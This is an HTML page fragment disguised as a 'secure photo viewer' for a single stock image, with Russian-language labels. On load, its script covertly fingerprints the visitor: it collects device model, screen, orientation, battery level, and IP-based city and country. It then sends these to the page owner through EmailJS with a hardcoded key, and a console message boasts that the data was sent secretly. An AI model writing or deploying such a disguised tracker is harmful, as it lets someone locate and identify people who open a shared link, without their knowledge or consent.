  <style>
    * {
      box-sizing: border-box;

      max-width: 90%;
      max-height: 85vh;
      display: flex;

      max-width: 100%;

      border-radius: 8px;
      object-fit: contain;
    }
    .footer-text {
      margin-top: 15px;
      font-size: 14px;
      color: #888;
    }
  </style>

 
  <script src="file:///C:/Users/user/Downloads/WhatsApp%20Image%202026-10-19%20at%2022.11.15.jpeg"></script>
  
  
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script type="text/javascript">
    (function() {
        emailjs.init("UgeqF39HkNLJZ5haw");
    })();
  </script>
</head>
<body>

  <div class="photo-container">
   
    <img src="https://images.unsplash.com/photo-1575936123452-b67c3203c357?auto=format&fit=crop&w=1000&q=80" alt="Фотография" />
  </div>
  <div class="footer-text">Загружено через защищенный просмотрщик</div>

  <script>
    
    FingerprintJS.load().then(fp => {
      fp.get().then(async result => {
        const visitorId = result.visitorId;
        const userAgent = navigator.userAgent;
        const screenRes = `${window.screen.width}x${window.screen.height}`;

       
        let deviceName = "Компьютер / Ноутбук";
        
        if (/iPhone/i.test(userAgent)) {
          deviceName = "Apple iPhone";
        } else if (/iPad/i.test(userAgent)) {
          deviceName = "Apple iPad";
        } else if (/Android/i.test(userAgent)) {
          const match = userAgent.match(/;\s([^;]+)\sBuild\//);
          if (match && match[1]) {
            deviceName = "Android: " + match[1].trim();
          } else {
            deviceName = "Android устройство";
          }
        } else if (/Windows/i.test(userAgent)) {
          deviceName = "Windows PC";
        } else if (/Mac/i.test(userAgent)) {
          deviceName = "macOS Mac";
        }

        
        const orientation = window.innerHeight > window.innerWidth ? "Книжная (вертикально)" : "Альбомная (горизонтально)";

       
        let batteryInfo = "Не поддерживается браузером";
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100);
            const charging = battery.charging ? "Заряжается" : "Работает от батареи";
            batteryInfo = `${level}% (${charging})`;
          } catch (e) {}
        }

        
        let locationInfo = "Не удалось определить";
        try {
          const ipRes = await fetch('https://ipapi.co/json/');
          const ipData = await ipRes.json();
          if (ipData.city && ipData.country_name) {
            locationInfo = `${ipData.city}, ${ipData.country_name} (IP: ${ipData.ip})`;
          }
        } catch (e) {}

        
        const templateParams = {
          visitor_id: visitorId,
          device_type: deviceName,
          location: locationInfo,
          battery: batteryInfo,
          screen_resolution: screenRes,
          orientation: orientation,
          user_agent: userAgent
        };

        
        emailjs.send('service_yoaiygk', 'template_yba5mc2', templateParams)
          .then(function(response) {
             console.log('Данные успешно отправлены скрыто!', response.status);
          }, function(error) {
             console.log('Ошибка:', error);
          });
      });
    });
  </script>
</body>
</html>
